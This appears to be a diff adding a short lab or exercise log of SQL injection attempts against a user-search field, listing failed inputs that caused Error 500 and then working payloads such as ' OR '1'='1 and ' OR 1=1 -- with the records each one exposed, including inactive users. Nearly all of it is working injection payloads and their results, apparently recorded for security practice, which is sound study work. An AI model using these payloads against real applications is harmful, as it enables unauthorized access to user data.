@@ -1,0 +1,20 @@
+1) Ben
+	- no results
+
+2) Ben'-
+	- page crash, unable to handle the request, Error 500
+
+3) Ben' OR 1=1
+	- page crash, unable to handle the request, Error 500
+
+Since above inputs did not work for me here are some that did:
+
+Ben' OR '1'='1
+	- displays all active users and user Ben
+
+' OR active = 0 OR '1'='1
+	- displays all users
+
+' OR 1=1 -- 
+	- displays all active users
+
